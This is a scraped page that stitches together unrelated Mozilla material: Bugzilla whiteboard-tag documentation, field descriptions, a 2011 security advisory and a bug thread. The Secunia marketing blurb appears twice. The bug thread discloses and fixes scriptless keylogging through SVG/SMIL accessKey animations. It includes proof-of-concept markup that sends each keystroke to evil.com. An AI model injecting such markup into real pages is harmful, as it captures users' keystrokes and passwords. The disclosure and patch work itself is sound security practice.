How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

# Mozilla Foundation Security Advisory 2011-56

## Key detection without JavaScript via SVG animation

Announced
December 20, 2011
Reporter
Mario Heiderich
Impact
Moderate
Products
Firefox, SeaMonkey, Thunderbird
Fixed in

* Firefox 9
* SeaMonkey 2.6
* Thunderbird 9

### Description

Security researcher **Mario Heiderich** reported it was
possible to use SVG animation `accessKey` events to detect
key strokes even when JavaScript was disabled. Since web pages can normally
detect key events through script and most users have scripting enabled this
does not present a risk for most users. In contexts where the user knows
scripting is disabled (reading mail, for example, or NoScript users) this
could allow a malicious web page to fool a user into interacting with
a prompt thinking it came from the browser or mail program.

Accessing remote content is disabled by default When reading mail in
Thunderbird and SeaMonkey. Successfully capturing keystrokes remotely would
require some social engineering to convince the user to turn it on.

SVG animation is not supported in Thunderbird 3.1 or Firefox 3.6.

## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

— [Details](attachment.cgi?id=576158&action=edit)

User Agent: Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Build ID: 20110928224103
Steps to reproduce:
SVG provides several elements allowing modification of existing element attributes. Those are <set>, <animate> and others: <http://www.w3.org/TR/SVG/animate.html>
These elements can contain an attribute called begin. This can -- among other values -- be applied with an access key listener by using the function accessKey(): <http://www.w3.org/TR/SVG/animate.html#TimingAttributes>
Example 1:
<!-- Press a to fill the circle with color 'red' -->
<svg height="50px">
<circle r="100">
<set attributeName="fill" begin="accessKey(a)" to="red" />
</circle>
</svg>
An attacker can use this to inject non-scripting markup into a website and afterwards record user's keystrokes. The attached test-case demonstrates that.
Example 2:
<!doctype html>
<form>
<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
<br>
<input name="secret" type="password">
</form>
<!-- injection -->
<svg height="50px">
<image xmlns:xlink="<http://www.w3.org/1999/xlink>">
<set attributeName="xlink:href" begin="accessKey(a)" to="//evil.com/?a" />
<set attributeName="xlink:href" begin="accessKey(b)" to="//evil.com/?b" />
<set attributeName="xlink:href" begin="accessKey(c)" to="//evil.com/?c" />
<set attributeName="xlink:href" begin="accessKey(d)" to="//evil.com/?d" />
</image>
</svg>
An MPEG video was made available as well to show the effect: <http://www.twitvid.com/ICOMS>
Actual results:
The attached test-case allows an attacker to send keystroke information to an arbitrary domain. Note: here we use //evil.com - you might want to change the PoC before testing to avoid referrer leakage.
The issue was tested on various Firefox versions including 7.0.1, 8 and 11.0a1 (latest nightly) both Win7 and Ubuntu. All tested versions showed the described behavior.
The problem occurs as well in case the user has JavaScript deactivated / uses NoScript. NoScript author Giorgio Maone was informed about the bug.
Expected results:
The access key listener should not listen on for keystrokes on document - or any given element on the loaded document. If necessary at all, the listener should work for the enclosing element, or the SVG -- but not leak to the rest of the document enclosing the SVG.
Firefox / Gecko-browsers are the only user agents showing this behavior (so far). Chrome and Opera do not leak the stroke listener to the whole document, IE doesn't support <set> and <animate>.

Just a short additional note on the chosen severity: I judged it rather high since depending on the context the risk for the affected websites and users might be very high.
Stealing keystrokes with JS disabled/NoScript blocking JS execution is nasty... but depends on the scenario. Feel free to rate it down if necessary ;)

The whole point of accesskey is that it should work no matter what's focused....
This sounds like it needs to be escalated to a spec issue for SVG.

Could you elaborate on Chrome/Opera's behavior? e.g. do they normally support accessKey in SVG, but not if a textbox is focused?

As long as this is restricted to the same document, then it seems like the SVG isn't really "stealing keystrokes" any more than the <input name="secret" type="password"> field is "stealing keystrokes", since the content receiving the keystrokes all comes from the same site. As soon as you've got untrusted content injected into a login page, all bets are kind of off. That said, it could still be worth trying to mitigate this.
I'm trying to think of an attack scenario. I could imagine an evil/compromised ad-banner service telling sites "paste this chunk of SVG directly into your webpage, to show our advertising banner (and look, no scripts, so it's safe!)" That seems like a bit of a stretch to me, but I can see it being worth worrying about.
Side note: It might be worth adding an about:config pref to completely disable accessKey support, for use by NoScript and paranoid users in general. (I say "paranoid" in the nicest of senses - I count myself in that group, generally. :))

In Opera you have to press Shift+Esc to activate access keys. The whole thing will look like this: <http://img12.imageshack.us/img12/5896/bildschirmfoto1m.png>
Chrome (as far as I can see) requires a link/input/.. with accesskey attribute to be able to use it. Seems no SVG accessKey() feature is available: <http://code.google.com/p/chromium/issues/detail?id=5607>

The attack scenario -- aside from markup injections and untrusted/semi-trusted sites running w/o JavaScript enabled -- are Iframes. What if malicious site A fames benign site B. A can -- even if no JS is active still steal keystrokes from B. We just have to combine the attack with autofocus.
The other way round works as well -- benign site A frames untrusted site B (that's what we have HTML5 sand-boxed Iframes for - right?) and B can grab keystrokes w/o being white-listed by simply handling autofocus "properly". I am sure there are more ways to abuse this.
In general, as a security aware user I would assume my browser to not fall for any shenanigans in case JS is off. With this feature/bug any website is still possible to build a detailed key-event model capable of using almost the full SVG feature set to channel-out the data to any other domain. In essence NoScript is rendered more or less useless by this bug ;)

This isn't very interesting because in 99% of cases JS is enabled. This only affects people who've disabled JS hoping that will prevent A from sniffing B's keystrokes. That's a very small audience.

Sandboxed iframes using this to grab keystrokes is a lot more interesting.

That is a huge exaggeration. The attack surface enabled by scripting is far larger and more interesting than access to key events.
I never wanted to implement this SMIL feature anyway, but I suppose it's too late to change that now :-(.
How about we disable all the input event SMIL triggers when scripting is disabled for the document?

FWIW, I filed [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") on potentially adding this pref.
(In reply to Robert O'Callahan (:roc) (Mozilla Corporation) from [comment #7](/show_bug.cgi?id=704482#c7 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"))

That seems reasonable. (I suppose that would make [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") unnecessary, though.)

I tend to disagree a tiny bit. I personally like to pretty much not care about scripting risks with NoScript as my support -- and I assume other do as well. This "feature" gives an attacker "scriptish" abilities with JS and plug-ins disabled including key-event like behavior and a SOP bypass. Where is the exaggeration in this?

My first hunch was "we definitely want accessKeys in script-disabled documents, because that lets you do cool things even without scripts!"
But really, we don't ever have any script-disabled documents, except for
(a) SVG images & external resource docs, which we don't send input to anyway
(b) Full pages in the browsers of users who explicitly have scripting disabled -- and that very small subset of users (per end of [comment 6](/show_bug.cgi?id=704482#c6 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript")) probably don't \*want\* accessKey-enhanced content.

You said "In essence NoScript is rendered more or less useless by this bug".
NoScript, and disabling JS in particular, provide far more protection than just blocking access to key events. Therefore that statement is an exaggeration.

FWIW I added an emoticon to underline that this particular statement wasn't meant too seriously. But to avoid getting lost in nonsense - do we then agree on this having rather low security impact? Assuming that only a mentioned small subset of users would be affected I don't see any reason not to publish the sources of the PoC for community review and feedback.Severity: critical → minorPriority: P2 → P4

May I ask you to keep this embargoed until I can publish a work-around for NoScript users, who are likely the vast majority of this "small subset"?
I hope this means just 7-10 days of delay, if AMO provides a timely approval for automatic update.

Looking good from my side. In combination with [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") I'd say extensions devs and users have enough levers at hand to avoid this info leak effectively.

Assuming the patch here gets review+ and lands, I think I'd rather we WONTFIX [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") -- if scripts are enabled, accessKey doesn't pose any additional risk and there's not much reason to disable it in a targeted way. (Until/unless someone comes up with a good reason / use-case, it's better to avoid adding an additional code-path and about:config pref that'll need maintaining/testing.)
(Note that I filed [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") back when I was in the mindset of the first chunk of [Comment 10](/show_bug.cgi?id=704482#c10 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") -- but after realizing the second chunk of [Comment 10](/show_bug.cgi?id=704482#c10 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"), I feel like [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") is probably unnecessary.)

Does it work also if JS is disabled via CAPS or docShell.allowJavascript?

I'm not absolutely sure offhand (I haven't used those before & don't immediately know how to set them in a small testcase), but I assume nsDocument::IsScriptEnabled() checks the state that those methods set.
Do you know of an easy way to test those? (It looks like docShell requires chrome privileges, right? and I'm not sure how to accesst CAPS -- MXR searches for 'CAPS' and 'caps' in .html & .js files didn't seem to find anything related.)

CTRL+SHIFT+J to open the Error Console, then evaluate
top.opener.gBrowser.selectedBrowser.allowJavascript = false;
From then on, the currently open tab on the window which you open the Error Console from should be JS-disabled via docShell.

CAPS is <http://www.mozilla.org/projects/security/components/ConfigPolicy.html> and lives in nsScriptSecurityManager, mostly.
The easiest way for you to test it is installing <http://noscript.net/getit> and opening the test case.

Worked around in NoScript 2.2.2rc1 ( <http://noscript.net/getit#devel> ).
@.mario, if it looks good for you I'm gonna submit it for autoupdate in the beta channel tomorrow, and on the stable channel as soon as 2.2.1 gets approved (in a couple of days, probably).
So, again, 7-10 days for disclosure. Thank you.

The keypress was still honored with those steps -- but I'm not sure this actually disabled javascript. On a simple document with
<body onclick="alert('click')" style="height: 100%; width: 100%"></body>
I still get alerts when I click, after typing the command into the error console, and also after I reload at that point (in case that's necessary).
So I don't think I've successfully tested the docShell JS-disabling-yet.

I verified that the patch works with CAPS, using NoScript -- the keypress doesn't start the animation, unless I allow scripts from mozilla.org.
(I used the "INSTALL" button on the noscript site rather than the dev version, to be sure I was benefiting from your workaround. I got version 2.2 -- based on [comment 23](/show_bug.cgi?id=704482#c23 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"), I think that's what I should have been testing)

Sorry, my fault, I forgot a "docShell" in the property access chain. Should have been:
top.opener.gBrowser.selectedBrowser.docShell.allowJavascript = false;
> I verified that the patch works with CAPS, using NoScript -- the keypress

Great, thanks. This means I can skip my work-around in the future based on Gecko version. Since NoScript 3.x uses docShell-based blocking instead of CAPS, though, knowing if that side is covered as well would be great too.

That worked -- it disabled scripts, and the accessKey (in the MDN testcase) isn't honored in subsequent loads.
(To clarify -- this patch blocks accessKey at \*parse\* time, so when you disable scripts (via any of the methods above), it generally won't prevent accessKey-handling until you reload.)

Does it mean that "content-document-global-created" observers which turn docShell.allowJavascript to false are safe?
If in doubt, you can test by installing <http://noscript.net/nsa> and checking the test case from <http://evil.hackademix.net/xss/svg.html>
Sorry, no UI NoScript >= 3 on desktop Firefox yet, but everything else works so evil.hackademix.net, which is not whitelisted, will have script blocked with the method above.

I installed that addon version (along with Firebug, for its network panel). With that setup, <http://evil.hackademix.net/xss/svg.html> actually aborted almost every time I visited it (that crash appears to be Firebug-dependent), with this abort message:
> ##!!! ABORT: Metadata corrupted: 'data == limit', file ../../../mozilla/netwerk/cache/nsCacheMetaData.cpp, line 181
However -- I was able to load it successfully one time (so it looked like the video from [comment 0](/show_bug.cgi?id=704482#c0 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript")), and I didn't get any per-keystroke output in the network panel. (This is using my patched build)
I tried to repeat this in an unpatched build for comparison, but I kept hitting the abort mentioned above, so I gave up.

Ah! I hadn't noticed that had a "Net" chunk in the Web Console. Handy. :)
Anyway, yes -- with my patch applied and NSA installed from your link, the hackademix xss/svg.html page doesn't leak network traffic (and instead shows parse errors in the Web Console for the accessKey() specifications being not rejected & dropped)
I also tested these other configurations, and they all leak network traffic on that page, as expected:
- basic build
- basic build, with NoScriptAnywhere installed
- patched build, without NoScriptAnywhere installed

I'm still not entirely sure what you meant by this question, but it sounds like the results above might give you the answer you were looking for. :)

(gah -- mochitest failure in test\_smilAccessKey.xhtml -- investigating, sorry. I did an mxr search for "accessKey" to find possibly-affected unittests (and I did find-in-page for "smil" and "svg" to filter those), but that didn't find this mochitest because MXR cut off the results at the first 1000 (most of which are non-SVG-related))

URL of orange test:
<http://mxr.mozilla.org/mozilla-central/source/content/smil/test/test_smilAccessKey.xhtml>
The test failure happens when we send a key event to a document that was created like so:
> document.implementation.createDocument(gSvgns, 'svg', null);
I'm willing to believe that scripts are legitimately disabled in documents that are dynamically created in this fashion (in which case the test-failure makes sense and the test's expectations should be changed), but I'm not sure yet.

(The failure is "Adopted node failed to catch accesskey event", from e.g. this test-failure log:
<https://tbpl.mozilla.org/php/getParsedLog.php?id=7561901&tree=Mozilla-Inbound> )
It looks like the test failure may actually indicate a bug in the patch -- while the node is created in a helper-document, it's ultimately adopted by the "main" document (which has scripts enabled), and it should definitely receive accessKey events there -- but it doesn't have "accessKey" specification because that got dropped/rejected back when it was parsed.
I think we might be able to fix this by changing the return code in the existing patch's "scripts disabled" case to NS\_OK, so that we'll accept the accessKey() string as a valid value for our attribute (and serialize it when transferring nodes between documents, etc), but still not actually honoring it beyond that.

FWIW I just tested the feature with Thunderbird 9.0 - and it works as well. I didn't test TB 8.0 yet.
Only limitation is: TB will initially ask once if external resources are allowed. After that keystrokes can be channeled out. Matter of social engineering to get a user to click yes...
Screen: <http://a.yfrog.com/img610/6136/fc3e.png>
I would really love to see a different access key handling here - why wouldn't Gecko require a modifier such as Alt+ or Ctrl+ combos such as Opera? Would this variation give [bug 704553](/show_bug.cgi?id=704553 "RESOLVED WONTFIX - SVG/SMIL: Create about:config pref to toggle accessKey support") another chance for survival? With the possible flag described in that ticket - set to false on TB and other non-browser Geckos - we'd have better security imho.
I took liberty of raising this ticket back to severity normal. Sorry for the switcheroo but this bug and it's range is a bit too dynamic ;)Severity: minor → normal

Attached patch

[patch 1 v2a: Parse but don't register](attachment.cgi?id=577012&action=diff)
— [Details](attachment.cgi?id=577012&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=704482&attachment=577012)

This updated patch only blocks accessKey at the point where we try to actually register for the event.
Unlike the previous patch, this one still lets us parse the accessKey value, so that an animation node that gets transfered between documents (without having its attributes re-parsed) will have the correct internal state to register for accessKey events in the new document, regardless of whether scripts were disabled in the old document.

Looks great, thanks Daniel.
I wonder if you think it's useful to include the bug number in the comment though? Or perhaps another sentence explaining why disabling script should also disable accesskeys? I suspect that to a casual observer who hasn't read this bug, the connection isn't obvious.

Good call -- for now, I added a comment referencing this bug, & pushed the fix:
<https://hg.mozilla.org/integration/mozilla-inbound/rev/65da73949345>
Ultimately, I agree that a sentence explaining the rationale would be better than a bug reference -- something like this:
> // 'accessKey' can allow key-logging in the document (just as scripts can). Users
> // who've disabled scripts probably won't expect documents to have that capability,
> // so we disable accessKey-registration if scripts are disabled.
For now I've left that comment out (and I haven't included any testcases), to make the attack scenario less obvious, until Giorgio gets out his workaround for NoScript users (and this bug is ready to be opened up), per [comment 13](/show_bug.cgi?id=704482#c13 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript").
(Hopefully the patch-landing itself doesn't break the spirit of [comment 13](/show_bug.cgi?id=704482#c13 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") -- apologies if it does. I did previously notice that <http://noscript.net/getit> already mentions "potentially dangerous SMIL elements" and "scriptless keylogging" in the changelog for the current NoScript RC, and I don't think the patch leaks any more information about potential attacks than that changelog does.)

patch 1 v2a: Parse but don't register
I'm not sure whether this is worth taking on 'beta' branch, but I think we might as well take this on Aurora.
Cost/benefit notes:
- Disables feature that could potentially be used for scriptless keylogging, when scripts are disabled. (The only location I know of where this has an effect is in web content for users who have scripts explicitly disabled - which is a pretty small audience.

- Small, targeted fix
- Touches a feature that's not used widely on the web (SVG animation isn't widely used, and in particular the SVG animation "accessKey" feature is not widely used). So, unlikely to have side-effects on existing content.

By default, we block remote content, unless the user whitelists the sender's e-mail address, and of course, e-mail addresses can be spoofed. So I think Thunderbird might be interested in having this fix for beta/TB 9. Though, not a lot of interesting keystrokes tend to happen in e-mail documents, if I'm understanding the scope of the problem.

What does happen in design mode, e.g. if user is forwarding the content?

Here's a .eml for a saved Thunderbird draft-message that includes a working accessKey-animated SVG rect. (View via File | Open Saved Message) You have to have HTML email enabled for this to work, of course.
I couldn't get this working with remote images (I couldn't get remote images to load at all in a saved message, actually), so I'm not sure this can be used to remotely log keystrokes while a user is viewing a message.
Still, even if the attack isn't possible, I think accessKey-targeted animations are (like scripts) the sort of thing we'd want disabled in mail-reader documents.

The saved message in [comment 49](/show_bug.cgi?id=704482#c49 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") honors accessKey (turns red) in Earlybird:
Mozilla/5.0 (X11; Linux x86\_64; rv:10.0a2) Gecko/20111201 Thunderbird/10.0a2
but not in Daily:
Mozilla/5.0 (X11; Linux x86\_64; rv:11.0a1) Gecko/20111202 Thunderbird/11.0a1
This indicates that Thunderbird mail-reader windows are indeed affected by this bug, and that they do indeed benefit from the fix in [comment 43](/show_bug.cgi?id=704482#c43 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript"). (hence Daily ignoring the animation)
This makes me even more inclined to land this on aurora branches, probably including Beta, for Thunderbird's benefit. Requesting beta approval as well. (See [comment 46](/show_bug.cgi?id=704482#c46 "RESOLVED FIXED - SVG / SMIL <set> and <animate> elements allow key-logging w/o JavaScript") thru this comment for justification)

Right - that makes this somewhat less concerning. (Attackers would only be able to detect keystrokes that are sent to the "display mail" document)

Nothing -- no SMIL animations play at all, including time-based animations. (not sure why, offhand)

My concern was whether this could be a wire-tapping exploit if the victim replied to or forwarded the mail. For regular received mail it's interesting but not too worrying as you point out.

Unsure of the scope of Alex's sec-review-needed request. In the context of fixing this information leak I've verified that this patch does the right thing in checking whether scripts are enabled (that call ultimately checks the CAPS state used by NoScript as well as the docshell setting used by Thunderbird and most likely the upcoming <iframe sandbox> implementation).
If there was a larger concern about SMIL or SVG the sec-review-needed should be transferred to a separate new bug that clarifies the request.Keywords: [sec-review-needed](/buglist.cgi?keywords=sec-review-needed&resolution=---) → [sec-review-complete](/buglist.cgi?keywords=sec-review-complete&resolution=---)Whiteboard: embargo until Thunderbird has a fix → [secr:dveditz] embargo until Thunderbird has a fix

dholbert pointed out you could mail someone a phish that pops up something that looks like the password dialog and maybe get users to type in their password. Would work best for a targeted attack where you knew what client and OS the victim used (from the user-agent in mail they sent you?). Could be a pretty effective spoof/phish.

Here's a POC .eml file to demo that. (It doesn't actually load remote resources -- I can't get that to work in the "Open Saved Message" UI" -- but I beliefe if this were an actual email & you'd hit the "Show Remote Content" button, then this could phone home your keypresses.)

Side note: there's a weird invalidation issue when the "dialog" appears. That's not visible in actual desktop interaction (for me at least) -- just in the screencast. So when you watch the screencast, ignore the bits that go blank at that point. :)

Hmm -- I think we probably need to broaden this patch.
Turns out we can trigger animations off of more generic events, too. (e.g. "click", "mouseover", "mouseout", "SVGLoad" (<-- not super-scary, but it's an example of an arbitrary event name that works when you listen for it) Setting begin=[any of the above] triggers animations for me (with scripts disabled), in a local testcase I just spun up.
I think we can actually listen for any event that could be passed into "addEventListener", basically.
